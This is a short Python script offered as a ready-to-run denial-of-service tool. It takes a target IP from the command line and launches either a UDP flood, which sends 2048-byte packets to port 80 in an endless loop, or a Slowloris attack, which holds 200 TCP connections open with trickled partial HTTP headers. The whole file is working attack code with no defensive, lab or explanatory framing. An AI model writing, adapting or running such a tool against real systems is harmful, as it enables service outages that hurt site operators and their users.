import sys
import socket
import threading
import time

def udp_flood(target_ip, target_port):
    print(f"Starting UDP flood attack on {target_ip}:{target_port}")
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b'A' * 2048
    while True:
        try:
            client.sendto(bytes, (target_ip, target_port))
        except Exception as e:
            print(f"Error sending UDP packet: {e}")
            break  # Exit the loop on error

def slowloris(target_ip, target_port):
    print(f"Starting Slowloris attack on {target_ip}:{target_port}")
    list_of_sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            list_of_sockets.append(s)
        except socket.error as e:
            print(f"Error creating socket: {e}")
            break

    while True:
        for s in list_of_sockets:
            try:
                s.send(b"X-a: b\r\n")
            except socket.error as e:
                print(f"Error sending data: {e}")
                list_of_sockets.remove(s)
                try:
                    s.close()
                except socket.error as e:
                    print(f"Error closing socket: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 attack_script.py [attack_type] [target_ip]")
        sys.exit(1)
    
    attack_type = sys.argv[1]
    target_ip = sys.argv[2]
    target_port = 80  # Default target port, can be adjusted as needed

    if attack_type == "udpflood":
        udp_flood(target_ip, target_port)
    elif attack_type == "slowloris":
        slowloris(target_ip, target_port)
    else:
        print("Invalid attack type! Use udpflood or slowloris.")
        sys.exit(1)
